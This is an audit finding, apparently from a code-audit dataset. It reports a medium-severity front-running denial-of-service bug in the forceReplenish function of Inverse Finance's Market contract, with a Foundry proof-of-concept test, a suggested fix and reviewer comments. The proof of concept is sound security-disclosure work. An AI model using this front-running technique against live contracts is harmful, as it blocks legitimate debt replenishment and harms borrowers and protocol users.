# [M] `Market::forceReplenish` can be DoSed

## Summary
Severity: Medium
Contest weight: 0.5049
Dataset id: 16956
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
[Market.sol#L562](https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L562)  

If a user wants to completely `forceReplenish` a borrower with deficit, the borrower or any other malicious party can front run this with a dust amount to prevent the replenish.

## Proof of Concept
```solidity
function testForceReplenishFrontRun() public {
    gibWeth(user, wethTestAmount);
    gibDBR(user, wethTestAmount / 14);
    uint initialReplenisherDola = DOLA.balanceOf(replenisher);

    vm.startPrank(user);
    deposit(wethTestAmount);
    uint borrowAmount = getMaxBorrowAmount(wethTestAmount);
    market.borrow(borrowAmount);
    uint initialUserDebt = market.debts(user);
    uint initialMarketDola = DOLA.balanceOf(address(market));
    vm.stopPrank();

    vm.warp(block.timestamp + 5 days);
    uint deficitBefore = dbr.deficitOf(user);
    vm.startPrank(replenisher);

    market.forceReplenish(user,1); // front run DoS

    vm.expectRevert("Amount > deficit");
    market.forceReplenish(user, deficitBefore); // fails due to amount being larger than deficit
    
    assertEq(DOLA.balanceOf(replenisher), initialReplenisherDola, "DOLA balance of replenisher changed");
    assertEq(DOLA.balanceOf(address(market)), initialMarketDola, "DOLA balance of market changed");
    assertEq(DOLA.balanceOf(replenisher) - initialReplenisherDola, initialMarketDola - DOLA.balanceOf(address(market)),
        "DOLA balance of market did not decrease by amount paid to replenisher");
    assertEq(dbr.deficitOf(user), deficitBefore-1, "Deficit of borrower was not fully replenished");

    // debt only increased by dust
    assertEq(market.debts(user) - initialUserDebt, 1 * replenishmentPriceBps / 10000, "Debt of borrower did not increase by replenishment price");
}
```

This requires that the two txs end up in the same block. If they end up in different blocks the front run transaction will need to account for the increase in deficit between blocks.

## Recommendation
Use `min(deficit,amount)` as amount to replenish.

Very similar to [`#439`](https://github.com/code-423n4/2022-10-inverse-findings/issues/439) and unclear as the benefit the attacker is gaining here. They would be better off just front running the entire transaction and getting additional reward. Will leave open for sponsor review, but most likely QA or invalid. 

Fixed in <https://github.com/InverseFinance/FrontierV2/pull/16.>  
Possible to imagine a situation where an attacker has an underwater loan and keeps front running his own forced replenishments with single digit DBR forced replenishments.
